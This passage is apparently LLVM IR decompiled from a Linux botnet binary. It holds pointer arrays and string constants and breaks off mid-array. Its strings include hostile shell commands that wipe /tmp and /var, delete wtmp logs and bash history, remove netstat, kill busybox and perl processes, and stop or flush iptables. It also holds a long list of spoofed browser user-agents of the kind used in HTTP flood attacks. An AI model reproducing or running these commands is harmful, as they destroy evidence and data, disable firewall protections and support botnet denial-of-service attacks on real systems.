@global_var_805a6bf.603, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a6c7.604, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a6d1.605, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a6dd.606, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a6e7.607, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a6f1.608, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a6fa.609, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805a706.610, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a717.611, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a720.612, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a729.613, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a733.614, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a73e.615, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a747.616, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a752.617, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a75d.618, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a767.619, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a772.620, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a77a.621, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a782.622, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a78c.623, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a798.624, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a7a2.625, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a7ac.626, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a7b5.627, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805a7c1.628, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a7d2.629, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a7db.630, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a7e4.631, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a7ee.632, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a7f7.633, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a800.634, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a80b.635, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a816.636, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a820.637, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a82b.638, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a833.639, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a83b.640, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a845.641, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a851.642, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a85b.643, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a865.644, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a86e.645, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805a87a.646, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a88b.647, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a894.648, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a89d.649, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a8a7.650, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a8b2.651, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_805a8bf.652, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_805a8ce.653, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805a8dd.654, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_805a8eb.655, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a8fa.656, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a906.657, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805a912.658, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805a920.659, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805a930.660, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805a93e.661, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a94c.662, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805a959.663, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_805a969.664, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a97e.665, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a98b.666, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805a998.667, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_805a9a6.668, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a9b5.669, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a3d8.530, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a9bf.670, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a9c9.671, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a9cf.672, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a9d5.673, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a9db.674, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a9e1.675, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a9e7.676, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a9ed.677, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a9f3.678, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a9f9.679, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805a9ff.680, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805aa06.681, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805aa0d.682, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805aa14.683, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805aa1b.684, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805aa22.685, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805aa29.686, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805aa30.687, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805aa37.688, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805aa3e.689, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805aa45.690, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa4c.691, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa4f.692, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa52.693, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa55.694, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa58.695, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa5b.696, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa5e.697, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa61.698, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805aa64.699, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aa67.700, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aa6b.701, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aa6f.702, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aa73.703, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aa77.704, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aa7b.705, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aa7f.706, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aa83.707, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aa87.708, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aa8b.709, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aa8f.710, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aa93.711, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805aa97.712, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805aaa3.713, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805aaa9.714, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805aab0.715, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aab6.716, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aaba.717, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aabe.718, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aac2.719, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aac6.720, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aaca.721, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aace.722, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aad2.723, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805aad6.724, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805aada.725, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805aadf.726, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805aae4.727, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805aae9.728, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805aaee.729, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805aaf3.730, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805aaf8.731, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805aafd.732, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805ab02.733, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805ab07.734, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805ab0c.735, i32 0, i32 0)]
@global_var_805ba68.737 = constant [100 x i8] c">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\0D\0A\00"
@global_var_805bae9.739 = constant [14 x i8] c"pkill -9 %s\0D\0A\00"
@global_var_805baf8.740 = constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00"
@global_var_805bb23.741 = constant [21 x i8] c"rm -rf /var/log/wtmp\00"
@global_var_805bb38.742 = constant [22 x i8] c"history -c;history -w\00"
@global_var_805bb4e.743 = constant [14 x i8] c"rm -rf /tmp/*\00"
@global_var_805bb5c.744 = constant [11 x i8] c"history -c\00"
@global_var_805bb67.745 = constant [23 x i8] c"rm -rf ~/.bash_history\00"
@global_var_805bb7e.746 = constant [20 x i8] c"rm -rf /bin/netstat\00"
@global_var_805bb92.747 = constant [11 x i8] c"history -w\00"
@global_var_805bb9d.748 = constant [17 x i8] c"pkill -9 busybox\00"
@global_var_805bbae.749 = constant [14 x i8] c"pkill -9 perl\00"
@global_var_805bbbc.750 = constant [22 x i8] c"service iptables stop\00"
@global_var_805bbd4.751 = constant [36 x i8] c"/sbin/iptables -F;/sbin/iptables -X\00"
@global_var_805bbf8.752 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_805bc38.753 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_805bc78.754 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_805bd08.755 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_805bd40.756 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_805bd60.757 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_805bd78.758 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_805bdd0.759 = constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00"
@global_var_805be70.760 = constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00"
@global_var_805bec4.761 = constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00"
@global_var_805bf38.762 = constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00"
@global_var_805bf78.763 = constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_805c030.764 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_805c084.765 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_805c0dc.766 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_805c134.767 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_805c174.768 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_805c1bc.769 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_805c214.770 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_805c280.771 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_805c2d8.772 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_805c328.773 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_805c34c.774 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_805c3a7.775 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_805c3b8.776 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_805c3e8.777 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_805c40c.778 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_805c42e.779 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_805c448.780 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_805c488.781 = constant [140 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_805c514.782 = constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_805c55c.783 = constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_805c5a4.784 = constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_805c5ec.785 = constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_805c634.786 = constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00"
@global_var_805c688.787 = constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00"
@global_var_805c6d8.788 = constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00"
@global_var_805c744.789 = constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00"
@global_var_805c798.790 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00"
@global_var_805c7f4.791 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00"
@global_var_805c850.792 = constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00"
@global_var_805c8b4.793 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00"
@global_var_805c910.794 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_805c96c.795 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_805c9c8.796 = constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_805ca28.797 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00"
@global_var_805ca70.798 = constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00"
@global_var_805cb08.799 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00"
@global_var_805cb54.800 = constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_805cba0.801 = constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00"
@global_var_805cbf0.802 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00"
@global_var_805cc38.803 = constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00"
@global_var_805cc8c.804 = constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00"
@global_var_805ccdc.805 = constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00"
@global_var_805cd24.806 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00"
@global_var_805cd70.807 = constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_805cdbc.808 = constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00"
@global_var_805ce04.809 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_805ce54.810 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_805cea4.811 = constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_805ced8.812 = constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_805cf0c.813 = constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00"
@global_var_805cf60.814 = constant [62 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_805bbf8.752, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_805bc38.753, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_805bc78.754, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_805bd08.755, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_805bd40.756, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_805bd60.757, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_805bd78.758, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @global_var_805bdd0.759, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_805be70.760, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_805bec4.761, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_805bf38.762, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @global_var_805bf78.763, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_805c030.764, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_805c084.765, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_805c0dc.766, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_805c134.767, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_805c174.768, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_805c1bc.769, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_805c214.770, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @global_var_805c280.771, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_805c2d8.772, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_805c328.773, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_805c34c.774, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_805c3a7.775, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_805c3b8.776, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_805c3e8.777, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_805c40c.778, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_805c42e.779, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_805c448.780, i32 0, i32 0), i8* getelementptr inbounds ([140 x i8], [140 x i8]* @global_var_805c488.781, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_805c514.782, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_805c55c.783, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_805c5a4.784, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_805c5ec.785, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_805c634.786, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_805c688.787, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @global_var_805c6d8.788, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_805c744.789, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_805c798.790, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_805c7f4.791, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @global_var_805c850.792, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_805c8b4.793, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_805c910.794, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_805c96c.795, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @global_var_805c9c8.796, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_805ca28.797, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_805ca70.798, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_805cb08.799, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_805cb54.800, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_805cba0.801, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_805cbf0.802, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @global_var_805cc38.803, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_805cc8c.804, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_805ccdc.805, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_805cd24.806, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_805cd70.807, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_805cdbc.808, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_805ce04.809, i32 0, i32 0), 